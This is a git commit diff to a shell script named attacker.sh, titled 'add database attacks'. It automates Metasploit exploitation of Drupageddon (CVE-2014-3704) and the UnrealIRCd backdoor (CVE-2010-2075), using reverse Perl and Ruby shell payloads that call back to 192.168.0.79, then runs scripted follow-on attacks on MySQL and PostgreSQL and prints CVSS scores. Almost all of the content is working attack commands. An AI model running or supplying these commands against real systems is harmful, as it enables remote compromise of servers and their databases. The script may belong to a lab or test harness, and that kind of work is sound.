9c7936e8e36c43f2bb463ae1cc1424c8beb4f7ea
Harrison Pratt <hpratt99@gmail.com>
2020-04-19 14:32:28 -0500

    add database attacks

--- attacker.sh
+++ attacker.sh
@@ -14,19 +14,30 @@ then
 	# in command shell run command background and then enter y
 	SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
 	rm results.txt
-	./attack-script.sh $TARGET mysql $SERVER 
+	./attack-script.sh $TARGET mysql $SERVER
+	./attack-script.sh $TARGET postgresql $SERVER 
 	echo "baseScore_V2: 10"
 	echo "severity_V2: HIGH"
 	echo "exploitabilityScore_V2: 10"
 elif [ $ATTACK == "CVE-2014-3704" ]
 then 
-	msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost 192.168.0.79; exploit; "
+	msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost 192.168.0.79; exploit; sessions -i 1 -c ./command_shell.sh; exit -y"
+	# in command shell run command background and then enter y
+        SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
+        rm results.txt
+        ./attack-script.sh $TARGET mysql $SERVER
+        ./attack-script.sh $TARGET postgresql $SERVER
 	echo "baseScore_V2: 7.5"
 	echo "severity_V2: HIGH"
 	echo "exploitabilityScore_V2: 10"
 elif [ $ATTACK == "CVE-2010-2075" ]
 then 
-	msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set rhost $TARGET; set rport 6697; set lhost 192.168.0.79; set payload cmd/unix/reverse_ruby; run; exit;"
+	msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set rhost $TARGET; set rport 6697; set lhost 192.168.0.79; set payload cmd/unix/reverse_ruby; run; sessions -i 1 -c ./command_shell.sh; exit -y;"
+	# in command shell run command background and then enter y
+        SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
+        rm results.txt
+        ./attack-script.sh $TARGET mysql $SERVER
+        ./attack-script.sh $TARGET postgresql $SERVER
 	echo "baseScore_V2: 7.5"
 	echo "severity_V2: HIGH"
 	echo "exploitabilityScore_V2: 10"
